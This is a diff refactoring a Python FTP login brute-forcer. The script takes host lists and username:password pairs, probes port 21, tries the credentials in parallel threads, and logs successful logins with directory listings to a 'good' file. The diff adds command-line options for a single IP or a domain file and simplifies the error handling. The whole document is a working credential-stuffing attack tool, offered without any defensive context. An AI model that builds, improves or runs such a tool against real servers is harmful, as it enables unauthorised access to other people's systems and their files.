@@ -1,3 +1,4 @@
+import argparse
 import socket
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
@@ -8,13 +9,15 @@ import os
 
 init(autoreset=True)
 
-for filename in ['domains.txt', 'good.txt']:
+def create_file_if_not_exists(filename):
     if not os.path.exists(filename):
         open(filename, 'w').close()
-        
+
+create_file_if_not_exists('domains.txt')
+create_file_if_not_exists('good.txt')
+
 logins_file = "logins.txt"
 good_file = "good.txt"
-bad_file = "bad.txt"
 domains_file = "domains.txt"
 max_threads = 10
 
@@ -42,16 +45,7 @@ def try_login(server, port, user, password):
                 print(", ".join(files))  
                 return (user, password, files) 
 
-    except ConnectionResetError:
-        return None
-    except socket.gaierror as e:
-        if e.errno == 11001:
-            return None
-        else:
-            return None
-    except socket.timeout:
-        return None  
-    except Exception as e:
+    except Exception:
         return None
     finally:
         sock.close()
@@ -71,15 +65,11 @@ def check_port_open(domain, port=21):
             sock.settimeout(2)
             sock.connect((domain, port))
             return True
-    except (ConnectionRefusedError, OSError) as e:
- #       print(f"Error: {e}") 
+    except (ConnectionRefusedError, OSError):
         return False
         
 with open(logins_file, 'r') as f:
     login_pairs = [line.strip() for line in f.readlines()]
-
-with open(domains_file, 'r') as f:
-    domains = [line.strip() for line in f.readlines()]
 
 def is_domain_good(domain):
     with open(good_file, 'r') as good:
@@ -88,14 +78,13 @@ def is_domain_good(domain):
     
 def process_logins(domain):
     if not check_port_open(domain):
-#        print(f"\nPort 21 closed for {Fore.RED}{domain}{Style.RESET_ALL}.")
         remove_domain(domain)  
         return []
 
     remove_domain(domain)
     if is_domain_good(domain):
+        print(f"{Fore.YELLOW}Domain {domain} already processed.{Style.RESET_ALL}")
         return []
-
     successful_logins = []
 
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
@@ -121,14 +110,27 @@ def process_logins(domain):
                 for user, password, files in successful_logins:
                     good.write(f"{domain} - {user}:{password} | Files: {', '.join(files)}\n")
 
-    else:
-        pass
-
     return successful_logins
 
-for domain in domains:
-    found_logins = process_logins(domain)
-    if found_logins:
-        print(f"\nFinished for {Fore.CYAN}{domain}{Style.RESET_ALL}. Logpasses:")
-        for user, password, files in found_logins:
-            print(f" - {Fore.GREEN}{user}:{password} | Files: {', '.join(files)}{Style.RESET_ALL}")
+def main():
+    parser = argparse.ArgumentParser(description="FTP login checker")
+    parser.add_argument("-ip", "--ip", help="Single IP address to check")
+    parser.add_argument("-file", "--file", help="File with domains to check", default=domains_file)
+    args = parser.parse_args()
+
+    domains = []
+    if args.ip:
+        domains = [args.ip]
+    elif args.file:
+        with open(args.file, 'r') as f:
+            domains = [line.strip() for line in f.readlines()]
+
+    for domain in domains:
+        found_logins = process_logins(domain)
+        if found_logins:
+            print(f"\nFinished for {Fore.CYAN}{domain}{Style.RESET_ALL}. Logpasses:")
+            for user, password, files in found_logins:
+                print(f" - {Fore.GREEN}{user}:{password} | Files: {', '.join(files)}{Style.RESET_ALL}")
+
+if __name__ == "__main__":
+    main()
